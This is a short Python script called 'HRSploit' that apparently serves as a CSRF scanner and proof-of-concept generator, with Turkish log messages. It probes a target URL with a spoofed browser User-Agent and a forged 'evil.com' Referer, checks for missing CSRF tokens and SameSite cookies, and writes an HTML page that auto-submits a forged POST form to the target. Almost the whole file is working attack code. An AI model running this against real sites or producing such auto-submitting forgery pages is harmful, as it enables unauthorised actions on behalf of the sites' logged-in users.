#!/usr/bin/env python3
"""HRSploit — CSRF Analysis & PoC Generator"""
import sys, requests, re, json, time
from pathlib import Path
from datetime import datetime
requests.packages.urllib3.disable_warnings()

def log(t, m, c="\033[93m"):
    print(f"{c}[{datetime.now().strftime('%H:%M:%S')}][{t}]\033[0m {m}", flush=True)
    time.sleep(0.05)

def find_forms(html):
    return re.findall(r'<form[^>]*action=[^>]+>', html, re.I)

def find_inputs(html):
    return re.findall(r'<input[^>]*name=["\']([^"\'>]+)["\']', html, re.I)

def analyze(target):
    sess = requests.Session(); sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0)"
    issues = []; log("CSRF", f"Analiz: {target}")
    try:
        r = sess.get(target, timeout=10)
        body = r.text.lower()
        has_token = any(t in body for t in ["csrf","_token","csrftoken","authenticity_token"])
        if not has_token:
            log("CSRF", "CSRF token YOK!", "\033[91m")
            issues.append("no_csrf_token")
        forms  = find_forms(r.text)
        inputs = find_inputs(r.text)
        log("CSRF", f"Form: {len(forms)} | Input: {len(inputs)}")
        for ck in r.cookies:
            rs = ck._rest.get("SameSite","") if hasattr(ck,"_rest") else ""
            if not rs:
                issues.append("no_samesite_" + ck.name)
        r2 = sess.get(target, headers={"Referer": "https://evil.com"}, timeout=8)
        if r2.status_code == 200:
            log("CSRF", "Referer kontrolu yok!", "\033[91m")
            issues.append("no_referer_check")
        if issues and inputs:
            form_action = target
            hidden_fields = ""
            for inp in inputs[:5]:
                hidden_fields += '<input type="hidden" name="' + inp + '" value="csrf_test"/>'
            poc = "<!DOCTYPE html>\n<html><body onload=\"document.forms[0].submit()\">"
            poc += "\n<form action=\"" + form_action + "\" method=\"POST\">"
            poc += hidden_fields
            poc += "\n</form></body></html>"
            poc_dir = Path("reports"); poc_dir.mkdir(exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            (poc_dir / f"csrf_poc_{ts}.html").write_text(poc)
            log("CSRF", f"PoC olusturuldu", "\033[91m")
    except Exception as e:
        log("CSRF", f"Hata: {e}", "\033[91m")
    out = Path("reports"); out.mkdir(exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    (out / f"csrf_{ts}.json").write_text(json.dumps({"target": target, "issues": issues}, indent=2))
    log("CSRF", f"Sorun: {len(issues)}", "\033[92m")
    return {"target": target, "issues": issues}

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else input("Hedef URL: ").strip()
    analyze(target)
